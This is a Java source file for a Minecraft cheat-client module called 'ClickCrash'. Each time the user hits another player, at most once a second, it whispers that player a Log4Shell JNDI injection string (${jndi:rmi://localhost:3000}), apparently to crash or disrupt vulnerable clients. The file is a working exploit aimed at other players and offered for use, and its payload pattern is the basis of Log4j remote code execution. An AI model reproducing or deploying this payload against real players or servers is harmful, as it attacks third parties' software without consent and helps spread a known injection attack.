package lord.daniel.alexander.module.impl.exploit;

import io.github.nevalackin.homoBus.Listener;
import io.github.nevalackin.homoBus.annotations.EventLink;
import lord.daniel.alexander.event.impl.game.AttackEvent;
import lord.daniel.alexander.module.abstracts.AbstractModule;
import lord.daniel.alexander.module.data.ModuleData;
import lord.daniel.alexander.module.enums.EnumModuleType;
import lord.daniel.alexander.util.math.time.TimeHelper;
import net.minecraft.entity.player.EntityPlayer;

/**
 * Written by Daniel. on 04/11/2023
 * Please don't use this code without my permission.
 *
 * @author Daniel.
 */
@ModuleData(name = "ClickCrash", enumModuleType = EnumModuleType.EXPLOIT)
public class ClickCrashModule extends AbstractModule {

    private final TimeHelper timeHelper = new TimeHelper();

    @EventLink
    public final Listener<AttackEvent> attackEventListener = attackEvent -> {
        if (attackEvent.getAttacking() instanceof EntityPlayer && timeHelper.hasReached(1000L)) {
            final EntityPlayer player = (EntityPlayer) attackEvent.getAttacking();
            mc.thePlayer.sendChatMessage("/msg " + player.getCommandSenderName() + " ${jndi:rmi://localhost:3000}");
            timeHelper.reset();
        }
    };

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }
}
